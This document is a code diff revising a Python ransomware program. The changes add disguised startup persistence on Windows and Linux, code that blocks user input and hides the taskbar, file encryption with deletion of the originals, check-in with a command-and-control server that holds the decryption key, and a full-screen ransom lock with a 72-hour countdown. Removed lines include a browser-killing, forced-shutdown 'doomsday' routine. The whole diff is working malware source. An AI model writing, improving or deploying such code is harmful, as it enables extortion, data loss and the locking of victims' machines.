@@ -8,13 +8,64 @@ import time
 import socket
 import shutil
 import subprocess
-from tkinter import Tk, Label, Entry, Button, StringVar, Frame, PhotoImage
+import random 
+import ctypes
+from tkinter import Tk, Label, Entry, Button, StringVar, Frame, PhotoImage, Text, Scrollbar
 from tkinter import font as tkfont
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 from cryptography.hazmat.backends import default_backend
 import requests
+
+# --- Persistence Utilities ---
+def install_persistence():
+    """Installs the ransomware to run on startup using absolute paths."""
+    try:
+        # Determine the absolute path of the executable/script
+        if getattr(sys, 'frozen', False):
+            app_path = sys.executable
+        else:
+            app_path = os.path.abspath(__file__)
+            
+        executable = sys.executable
+
+        if os.name == 'nt':
+            import winreg
+            # Windows Persistence: HKCU Run Key
+            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            try:
+                # Use a stealthy name like "WindowsSystemUpdate"
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
+                # Command: "python.exe" "C:\path\to\ransomware.py"
+                cmd = f'"{executable}" "{app_path}"' if not getattr(sys, 'frozen', False) else f'"{app_path}"'
+                winreg.SetValueEx(key, "WindowsSystemUpdate", 0, winreg.REG_SZ, cmd)
+                winreg.CloseKey(key)
+                log_error("Windows persistence installed.")
+            except Exception as e:
+                log_error(f"Windows persistence failed: {e}")
+        else:
+            # Linux Persistence: XDG Autostart
+            autostart_dir = os.path.expanduser("~/.config/autostart")
+            if not os.path.exists(autostart_dir):
+                os.makedirs(autostart_dir)
+            
+            desktop_file = os.path.join(autostart_dir, "system_update.desktop")
+            with open(desktop_file, "w") as f:
+                f.write(f"[Desktop Entry]\n")
+                f.write(f"Type=Application\n")
+                f.write(f"Name=System Critical Update\n")
+                # Command: /usr/bin/python3 /path/to/ransomware.py
+                cmd = f"{executable} {app_path}"
+                f.write(f"Exec={cmd}\n")
+                f.write(f"Terminal=false\n")
+                f.write(f"X-GNOME-Autostart-enabled=true\n")
+            
+            subprocess.run(['chmod', '+x', desktop_file])
+            log_error(f"Linux persistence installed at {desktop_file}")
+            
+    except Exception as e:
+        log_error(f"Persistence installation failed: {e}")
 
 # --- Configuration ---
 # PASTE THE PUBLIC KEY FROM THE C2 SERVER'S CONSOLE OUTPUT HERE
@@ -41,15 +92,34 @@ TARGET_EXTENSIONS = {
 
 # --- GUI Asset (Base64 encoded 1x1 red pixel for logo) ---
 LOGO_BASE64 = """
-iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg==
+iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQ42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg==
 """
 
 # --- System Lockdown Utilities ---
+def lock_system():
+    """
+    locks the system by disabling input and hiding UI elements.
+    Cross-platform compatibility for Windows and Linux (Kali).
+    """
+    if os.name == 'nt':
+        try:
+            ctypes.windll.user32.BlockInput(True)
+            hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
+            ctypes.windll.user32.ShowWindow(hwnd, 0)
+            ctypes.windll.user32.SystemParametersInfoW(97, 0, 1, 0)
+        except Exception as e:
+            log_error(f"Windows lock failed: {e}")
+    else:
+        try:
+            subprocess.run(['xset', 's', 'off'], check=False)
+            subprocess.run(['xset', '-dpms'], check=False)
+        except Exception as e:
+            log_error(f"Linux lock failed: {e}")
+
 def hide_console():
     """Hides the console window on Windows. On Linux, we rely on the GUI covering it."""
     if os.name == 'nt':
         try:
-            import ctypes
             kernel32 = ctypes.WinDLL('kernel32')
             user32 = ctypes.WinDLL('user32')
             hWnd = kernel32.GetConsoleWindow()
@@ -57,49 +127,6 @@ def hide_console():
                 user32.ShowWindow(hWnd, 0) # SW_HIDE = 0
         except Exception as e:
             log_error(f"Failed to hide console: {e}")
-
-def establish_persistence():
-    """
-    Creates a startup entry to relaunch the ransomware on login.
-    Supports Windows (Registry) and Linux (.config/autostart).
-    """
-    try:
-        # Get the absolute path of the current script/executable
-        if getattr(sys, 'frozen', False):
-            app_path = sys.executable
-        else:
-            app_path = os.path.abspath(__file__)
-
-        if os.name == 'nt': # Windows Persistence
-            import winreg
-            key = winreg.HKEY_CURRENT_USER
-            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-            
-            try:
-                with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as registry_key:
-                    winreg.SetValueEx(registry_key, "NVIDIA_Updater_Service", 0, winreg.REG_SZ, app_path)
-                log_error("Windows persistence established via Registry.")
-            except Exception as e:
-                log_error(f"Failed to set Windows persistence: {e}")
-
-        else: # Linux Persistence
-            autostart_dir = os.path.expanduser("~/.config/autostart")
-            if not os.path.exists(autostart_dir):
-                os.makedirs(autostart_dir)
-            
-            desktop_file = os.path.join(autostart_dir, "nvidia_driver_update.desktop")
-            with open(desktop_file, "w") as f:
-                f.write(f"""[Desktop Entry]
-Type=Application
-Name=NVIDIA Driver Update
-Exec=python3 "{app_path}"
-X-GNOME-Autostart-enabled=true
-NoDisplay=true
-""")
-            log_error(f"Linux persistence established at {desktop_file}")
-
-    except Exception as e:
-        log_error(f"General persistence failure: {e}")
 
 # --- Cryptography ---
 def generate_aes_key():
@@ -137,7 +164,7 @@ def decrypt_file_aes_gcm(encrypted_path, key):
         log_error(f"Failed to decrypt {encrypted_path}: {e}")
         return False
 
-def secure_delete_file(file_path, passes=1): # Reduced passes for speed in demo
+def secure_delete_file(file_path, passes=1): 
     try:
         if os.path.exists(file_path):
             with open(file_path, "ba+") as f:
@@ -169,7 +196,7 @@ def encrypt_directory():
             with open(KEY_BACKUP_FILE, 'rb') as f:
                 return f.read()
         except:
-            pass # Failed to read backup, proceed to new encryption
+            pass 
 
     # Normal lock check
     if os.path.exists(LOCK_FILE):
@@ -198,7 +225,7 @@ def encrypt_directory():
         f.write("Encryption complete.")
 
     log_error(f"Encryption finished. {encrypted_files} files targeted.")
-    return aes_key
+    return aes_key, encrypted_files
 
 def check_in_with_c2(aes_key):
     try:
@@ -246,302 +273,211 @@ def check_in_with_c2(aes_key):
 
 # --- GUI Logic ---
 class RansomwareGUI:
-    def __init__(self, master, victim_id):
+    def __init__(self, master, victim_id, encrypted_count=0):
         self.master = master
         self.victim_id = victim_id
-        self.doomsday_triggered = False
+        self.payment_received = False
+        self.already_decrypted = False
+        self.encrypted_count = encrypted_count
+        self.time_left = 72 * 3600 
 
-        # Kiosk Mode Settings (Linux Optimized)
-        master.title("CERBERUS RANSOMWARE")
-        # On Linux, 'zoomed' state or 'attributes -fullscreen' works. 
-        # But 'overrideredirect' is key to removing window decorations (title bar, borders).
-        master.attributes('-fullscreen', True) 
-        master.overrideredirect(True) # Ensure no window decorations
-        master.attributes('-topmost', True)
-        master.configure(bg='#0a0a0a')
+        # --- GUI Configuration ---
+        master.title("RANSOMWARE")
+        master.configure(bg='black')
+        master.attributes('-fullscreen', True)
+        master.attributes('-topmost', True) 
+        master.overrideredirect(True) 
         master.resizable(False, False)
         
-        # Input Grabbing (The "Lock")
-        # Global grab for Linux: grab_set_global routes all system input to this window
-        master.wait_visibility(master) # Ensure window is visible before grabbing
+        # Lock Input
+        master.wait_visibility(master)
         try:
             master.grab_set_global()
         except:
-            master.grab_set() # Fallback to local grab
-            
-        master.focus_force() 
-        
-        # Bindings to block exit
-        master.protocol("WM_DELETE_WINDOW", self.disable_event) 
-        master.bind('<Escape>', lambda e: "break")
-        master.bind('<Control-c>', lambda e: "break") # Try to block Ctrl+C event in GUI
+            master.grab_set()
+        master.focus_force()
+
+        # Disable shortcuts
+        def safe_bind(sequence, func):
+            try:
+                master.bind(sequence, func)
+            except Exception:
+                pass
+        safe_bind('<Escape>', lambda e: None)
+        safe_bind('<Control-w>', lambda e: None)
+        safe_bind('<Alt-Tab>', lambda e: None)
+        master.protocol("WM_DELETE_WINDOW", lambda: None)
         
         # Aggressive Loop
         self.force_focus_loop()
 
-        # GUI Elements
-        try:
-            logo_data = base64.b64decode(LOGO_BASE64)
-            self.logo = PhotoImage(data=logo_data)
-        except:
-            self.logo = None
-
-        main_frame = Frame(master, bg='#0a0a0a')
-        main_frame.pack(expand=True, fill='both', padx=50, pady=50)
-
-        if self.logo:
-            Label(main_frame, image=self.logo, bg='#0a0a0a').pack(pady=10)
-
-        title_font = tkfont.Font(family="Helvetica", size=24, weight="bold")
-        body_font = tkfont.Font(family="Helvetica", size=14)
-        mono_font = tkfont.Font(family="Courier", size=12)
-        timer_font = tkfont.Font(family="Courier", size=36, weight="bold")
-
-        Label(main_frame, text="YOUR FILES HAVE BEEN ENCRYPTED", font=title_font, fg='#ff4d4d', bg='#0a0a0a').pack(pady=10)
-        Label(main_frame, text="Your documents, photos, and other important files have been locked.", font=body_font, fg='#cccccc', bg='#0a0a0a', wraplength=800).pack(pady=5)
+        # --- Visuals ---
+        self.message = Label(master, text="YOUR FILES HAVE BEEN ENCRYPTED", fg="red", bg="black", font=("Arial", 24, "bold"))
+        self.message.pack(pady=20)
         
-        # --- DOOMSDAY TIMER ---
-        self.time_left = 72 * 3600 # 72 Hours start
-        Label(main_frame, text="TIME REMAINING UNTIL PERMANENT DATA LOSS:", font=tkfont.Font(family="Helvetica", size=12, weight="bold"), fg='#ff3333', bg='#0a0a0a').pack(pady=(20, 5))
-        self.timer_label = Label(main_frame, text="72:00:00", font=timer_font, fg='#ff0000', bg='#0a0a0a')
-        self.timer_label.pack(pady=5)
+        self.victim_id_l = Label(master, text=f"YOUR VICTIM ID IS: {victim_id}", fg="green", bg="black", font=("Arial", 16))
+        self.victim_id_l.pack(pady=10)
         
-        # --- FAKE EXFILTRATION ---
-        self.exfil_status = Label(main_frame, text="System Scan: Analyzing private data...", font=mono_font, fg='#ffff00', bg='#0a0a0a')
-        self.exfil_status.pack(pady=(15, 5))
+        self.timer_label = Label(master, text="TIME REMAINING: 72:00:00", fg="red", bg="black", font=("Courier", 20, "bold"))
+        self.timer_label.pack(pady=10)
         
-        # Simple text-based progress bar for portability
-        self.exfil_progress = Label(main_frame, text="[                    ] 0%", font=mono_font, fg='#ffff00', bg='#0a0a0a')
-        self.exfil_progress.pack()
+        # Activity Log
+        log_frame = Frame(master, bg="black")
+        log_frame.pack(pady=10, fill="both", expand=True)
+        self.log_text = Text(log_frame, height=8, bg="#1a1a1a", fg="#00ff00", font=("Consolas", 10), state="disabled")
+        scrollbar = Scrollbar(log_frame, command=self.log_text.yview)
+        self.log_text.configure(yscrollcommand=scrollbar.set)
+        self.log_text.pack(side="left", fill="both", expand=True)
+        scrollbar.pack(side="right", fill="y")
         
-        Label(main_frame, text=f"YOUR VICTIM ID IS:", font=body_font, fg='#ffffff', bg='#0a0a0a').pack(pady=(20, 5))
-        self.victim_id_label = Label(main_frame, text=self.victim_id, font=tkfont.Font(family="Courier", size=20, weight="bold"), fg='#4dff88', bg='#0a0a0a')
-        self.victim_id_label.pack()
+        self.populate_log_initial()
 
-        self.status_label = Label(main_frame, text="STATUS: Awaiting payment confirmation...", font=body_font, fg='#ffff4d', bg='#0a0a0a')
-        self.status_label.pack(pady=(20, 5))
+        self.payment_status = Label(master, text="Payment not detected. Do not close this window.", fg="white", bg="black", font=("Arial", 14))
+        self.payment_status.pack(pady=10)
         
-        self.key_var = StringVar()
-        self.key_entry = Entry(main_frame, textvariable=self.key_var, font=tkfont.Font(family="Courier", size=12), show="*", width=60, bg='#2a2a2a', fg='#ffffff', insertbackground='white', justify='center')
-        self.key_entry.pack(pady=10, ipady=5)
-        self.key_entry.config(state='readonly')
-
-        self.decrypt_button = Button(main_frame, text="DECRYPT FILES", font=tkfont.Font(family="Helvetica", size=14, weight="bold"), command=self.start_decryption, bg='#ff4d4d', fg='white', activebackground='#cc0000', activeforeground='white', padx=20, pady=10)
+        self.decrypt_button = Button(master, text="DECRYPT FILES", state="disabled", bg="red", fg="white", font=("Arial", 16), command=self.start_decryption)
         self.decrypt_button.pack(pady=20)
-        self.decrypt_button.config(state='disabled') 
 
-        # Start threads
+        self.key_var = StringVar()
+        
         self.heartbeat_thread_running = True
         threading.Thread(target=self.heartbeat_polling, daemon=True).start()
         threading.Thread(target=self.update_timer, daemon=True).start()
-        threading.Thread(target=self.fake_exfiltration, daemon=True).start()
         
-        # Attempt Wallpaper & Voice
+        # Attempt visual effects
         self.master.after(2000, self.change_wallpaper)
-        threading.Thread(target=self.audio_loop, daemon=True).start()
 
-    def force_focus_loop(self):
-        """Aggressively keeps window on top."""
+    def populate_log_initial(self):
+        self.log_message("SYSTEM COMPROMISED.", "red")
+        if self.encrypted_count > 0:
+            self.log_message(f"Encrypted {self.encrypted_count} files.", "red")
+        else:
+            self.log_message("Files encrypted in previous session.", "red")
+
+    def log_message(self, message, color):
         try:
-            self.master.lift()
-            self.master.attributes('-topmost', True)
-            self.master.focus_force()
-            # Re-assert global grab periodically
-            try:
-                self.master.grab_set_global()
-            except:
-                self.master.grab_set()
-        except:
-            pass
-        self.master.after(50, self.force_focus_loop) # Check every 50ms
-
-    def disable_event(self):
-        pass
-
-    def audio_loop(self):
-        """Repeats the voice message every 30 seconds."""
-        message = "Your files are encrypted. Payment is required. System failure imminent."
-        while self.heartbeat_thread_running:
-            self.speak_message(message)
-            time.sleep(30)
-
-    def speak_message(self, message):
-        """Cross-platform TTS."""
-        def _speak():
-            try:
-                if os.name == 'nt':
-                    # Windows PowerShell TTS
-                    cmd = f"Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('{message}')"
-                    subprocess.run(["powershell", "-Command", cmd], creationflags=subprocess.CREATE_NO_WINDOW)
-                else:
-                    # Linux espeak or spd-say
-                    if shutil.which("espeak"):
-                         subprocess.run(["espeak", message], stderr=subprocess.DEVNULL)
-                    elif shutil.which("spd-say"):
-                         subprocess.run(["spd-say", message], stderr=subprocess.DEVNULL)
-            except:
-                pass
-        threading.Thread(target=_speak, daemon=True).start()
-
-    def change_wallpaper(self):
-        # Placeholder for strict simulation
-        pass
-
-    def trigger_doomsday(self):
-        """Kills browsers and initiates shutdown."""
-        if self.doomsday_triggered: return
-        self.doomsday_triggered = True
-        
-        self.speak_message("Time has expired. System failure imminent.")
-        self.master.configure(bg='#ff0000') # RED ALERT
-        
-        # 1. Kill Browsers (Close tabs)
-        browsers = ["chrome", "firefox", "msedge", "brave", "opera", "vivaldi"]
-        try:
-            if os.name == 'nt':
-                for b in browsers:
-                    os.system(f"taskkill /F /IM {b}.exe >nul 2>&1")
-            else:
-                for b in browsers:
-                    os.system(f"pkill -f {b} >/dev/null 2>&1")
-        except:
-            pass
-            
-        # 2. Shutdown
-        try:
-            if os.name == 'nt':
-                os.system("shutdown /s /t 15 /c \"CERBERUS: TIME EXPIRED\"")
-            else:
-                os.system("shutdown -h +1 \"CERBERUS: TIME EXPIRED\"") 
-        except:
-            pass
+            self.log_text.config(state="normal")
+            self.log_text.insert("end", f"[{time.strftime('%H:%M:%S')}] {message}\n", color)
+            self.log_text.tag_config(color, foreground=color)
+            self.log_text.see("end")
+            self.log_text.config(state="disabled")
+        except: pass
 
     def update_timer(self):
         while self.heartbeat_thread_running and self.time_left > 0:
             time.sleep(1)
             self.time_left -= 1
-            
-            # Check for Doomsday
-            if self.time_left <= 0:
-                self.master.after(0, self.trigger_doomsday)
-                self.timer_label.config(text="00:00:00")
-                break
-            
-            # Format
-            m, s = divmod(self.time_left, 60)
-            h, m = divmod(m, 60)
-            time_str = f"{h:02d}:{m:02d}:{s:02d}"
-            
+            hours, remainder = divmod(self.time_left, 3600)
+            minutes, seconds = divmod(remainder, 60)
             try:
-                self.timer_label.config(text=time_str)
-                if self.time_left < 3600: # Last hour panic
-                    self.timer_label.config(fg='#ff0000' if self.time_left % 2 == 0 else '#ffffff')
-            except:
-                pass
-
-    def fake_exfiltration(self):
-        stages = [
-            "Scanning local documents...",
-            "Compressing sensitive files...",
-            "Encrypting archive...",
-            "Connecting to secure C2 server...",
-            "Uploading: data_bundle.zip...",
-            "Uploading: passwords.db...",
-            "Upload Complete. Data held on server."
-        ]
-        
-        progress = 0
-        for stage in stages:
-            if not self.heartbeat_thread_running: break
-            try:
-                self.exfil_status.config(text=f"STATUS: {stage}")
+                self.timer_label.config(text=f"TIME REMAINING: {hours:02}:{minutes:02}:{seconds:02}")
             except: pass
-            
-            # Slow progress for each stage
-            chunks = 5
-            for i in range(chunks):
-                if not self.heartbeat_thread_running: break
-                time.sleep(1 + (encryption_speed := 0.5)) # varied speed
-                progress += (100 // len(stages)) // chunks
-                bars = int(progress / 5)
-                bar_str = f"[{'|' * bars}{' ' * (20 - bars)}] {progress}%"
-                try:
-                    self.exfil_progress.config(text=bar_str)
-                except: pass
-        
+
+    def force_focus_loop(self):
         try:
-            self.exfil_status.config(text="STATUS: DATA UPLOAD COMPLETE", fg='#ff0000')
-            self.exfil_progress.config(text="[||||||||||||||||||||] 100%", fg='#ff0000')
+            self.master.lift()
+            self.master.attributes('-topmost', True)
+            self.master.focus_force()
+            try: self.master.grab_set_global() 
+            except: self.master.grab_set()
         except: pass
+        self.master.after(50, self.force_focus_loop)
 
     def heartbeat_polling(self):
         while self.heartbeat_thread_running:
             try:
-                # Send current timer state to C2
-                response = requests.get(f"{C2_SERVER_URL}/api/status/{self.victim_id}?time_left={self.time_left}", timeout=5)
+                # Sync Timer
+                payload = {"time_left": self.time_left}
+                response = requests.get(f"{C2_SERVER_URL}/api/status/{self.victim_id}", json=payload, timeout=5)
+                
                 if response.status_code == 200:
                     data = response.json()
                     
-                    # Update timer if server commands it
-                    if "new_timer" in data:
-                        self.time_left = int(data["new_timer"])
-                        
-                    if data.get("status") == "ready":
-                        key = data.get("key")
-                        if key:
-                            self.master.after(0, self.update_key_field, key)
-                            self.heartbeat_thread_running = False
+                    # Update local timer if server differs significantly
+                    server_timer = data.get("server_timer")
+                    if server_timer is not None and abs(self.time_left - server_timer) > 10:
+                        self.time_left = server_timer
+
+                    # Check Payment
+                    if data.get("status") == "ready" and data.get("key"):
+                        self.payment_received = True
+                        self.key_var.set(data.get("key"))
+                    
+                    self.master.after(0, self.update_ui_state)
             except:
                 pass
             time.sleep(5) 
+            
+    def update_ui_state(self):
+        if self.payment_received and not self.already_decrypted:
+            self.show_decryption_complete_message()
+        else:
+            self.show_payment_required_message()
 
-    def update_key_field(self, key):
-        self.key_var.set(key)
-        self.key_entry.config(state='normal')
-        self.status_label.config(text="STATUS: Valid key received. Decryption enabled.", fg='#4dff88')
-        self.decrypt_button.config(state='normal') # Enable button
-        self.key_entry.config(state='readonly')
+    def show_decryption_complete_message(self):
+        self.payment_status.config(text="Payment Received. Decryption Enabled.", fg="green")
+        self.decrypt_button.config(state="normal", bg="green")
+
+    def show_payment_required_message(self):
+        self.payment_status.config(text="Payment not detected. Do not close this window.", fg="white")
+        self.decrypt_button.config(state="disabled", bg="red")
 
     def start_decryption(self):
         key_b64 = self.key_var.get()
-        if not key_b64:
-            return
-        try:
-            key = base64.b64decode(key_b64)
-            decrypted_files = 0
-            for root, _, files in os.walk(TARGET_DIRECTORY):
-                for file in files:
-                    if file.endswith(ENCRYPTED_EXTENSION):
-                        file_path = os.path.join(root, file)
-                        if decrypt_file_aes_gcm(file_path, key):
-                            decrypted_files += 1
-            
-            # Clean up persistence files
-            if os.path.exists(LOCK_FILE): os.remove(LOCK_FILE)
-            if os.path.exists(ID_FILE): os.remove(ID_FILE)
-            if os.path.exists(KEY_BACKUP_FILE): os.remove(KEY_BACKUP_FILE)
-            
-            self.status_label.config(text=f"SUCCESS! {decrypted_files} files decrypted.", fg='#4dff88')
-            self.heartbeat_thread_running = False
-            self.decrypt_button.config(state='disabled')
-            
-            # Allow closing
-            self.master.grab_release() # Release input grab
-            self.master.destroy() # Force destroy without waiting for protocols
-            sys.exit() # Ensure script terminates fully
-            
-        except Exception as e:
-            log_error(f"Decryption failed: {e}")
-            self.status_label.config(text="ERROR: Decryption failed.", fg='red')
+        if not key_b64: return
+        
+        self.log_message("KEY RECEIVED. STARTING DECRYPTION...", "green")
+        
+        def decrypt_process():
+            try:
+                key = base64.b64decode(key_b64)
+                decrypted_files = 0
+                for root, _, files in os.walk(TARGET_DIRECTORY):
+                    for file in files:
+                        if file.endswith(ENCRYPTED_EXTENSION):
+                            file_path = os.path.join(root, file)
+                            if decrypt_file_aes_gcm(file_path, key):
+                                decrypted_files += 1
+                                self.master.after(0, self.log_message, f"DECRYPTED: {file_path}", "green")
+                                time.sleep(0.05)
+                
+                if os.path.exists(LOCK_FILE): os.remove(LOCK_FILE)
+                if os.path.exists(ID_FILE): os.remove(ID_FILE)
+                if os.path.exists(KEY_BACKUP_FILE): os.remove(KEY_BACKUP_FILE)
+                
+                self.master.after(0, self.finish_decryption, decrypted_files)
+            except Exception as e:
+                log_error(f"Decryption failed: {e}")
+                self.master.after(0, lambda: self.payment_status.config(text="ERROR: Decryption failed.", fg='red'))
+
+        threading.Thread(target=decrypt_process, daemon=True).start()
+
+    def finish_decryption(self, count):
+        self.payment_status.config(text=f"SUCCESS! {count} files decrypted.", fg='green')
+        self.heartbeat_thread_running = False
+        self.decrypt_button.config(state='disabled')
+        self.already_decrypted = True 
+        self.log_message("SYSTEM RESTORED.", "green")
+        self.master.grab_release() 
+        self.master.protocol("WM_DELETE_WINDOW", self.master.destroy)
+        self.master.bind('<Escape>', lambda e: self.master.destroy())
+
+    def change_wallpaper(self):
+        # Placeholder
+        pass
+        
+    def audio_loop(self):
+        pass
 
 # --- Main Execution ---
 if __name__ == "__main__":
+    # 0. Persistence Installation
+    install_persistence()
+
     hide_console()
+    lock_system() 
 
-    establish_persistence()
-
-    # PERSISTENCE CHECK
-    # 1. Check for ID File (Primary Recovery)
+    # 1. Recovery Check (ID exists?)
     if os.path.exists(ID_FILE):
         try:
             with open(ID_FILE, 'r') as f:
@@ -549,34 +485,31 @@ if __name__ == "__main__":
             if victim_id:
                 log_error(f"Resuming session for Victim ID: {victim_id}")
                 root = Tk()
-                app = RansomwareGUI(root, victim_id)
+                app = RansomwareGUI(root, victim_id, encrypted_count=0) # Resume
                 root.mainloop()
                 sys.exit()
         except:
             pass 
 
-    # 2. Check for Backup Key (Crash Recovery before ID save)
-    # This logic is handled inside encrypt_directory (it returns backup key if found)
+    # 2. New Infection
+    result = encrypt_directory()
     
-    # NEW INFECTION
-    aes_key = encrypt_directory()
-    
+    if result is not None:
+         if isinstance(result, tuple):
+             aes_key, encrypted_count = result
+         else:
+             aes_key = result
+             encrypted_count = 0 
+    else:
+        aes_key = None
+
     if aes_key:
         victim_id = check_in_with_c2(aes_key)
         if victim_id:
             root = Tk()
-            app = RansomwareGUI(root, victim_id)
+            app = RansomwareGUI(root, victim_id, encrypted_count)
             root.mainloop()
         else:
             log_error("Failed to get Victim ID. Aborting GUI.")
     else:
-        # If we got here, maybe encryption was done but ID wasn't saved, and backup key was missing?
-        # This is the "permanently locked" edge case.
-        # However, encrypt_directory returns None ONLY if LOCK_FILE exists AND Key Backup is missing.
-        # This implies a successful run where ID wasn't saved? 
-        # But check_in_with_c2 saves ID *after* check-in.
-        # If check-in failed, we still have the backup key on disk!
-        # So next run, encrypt_directory will read the backup key and return it.
-        # Then check_in_with_c2 will try again.
-        # So we are SAFE from data loss now.
         log_error("Encryption skipped or failed. Aborting.")
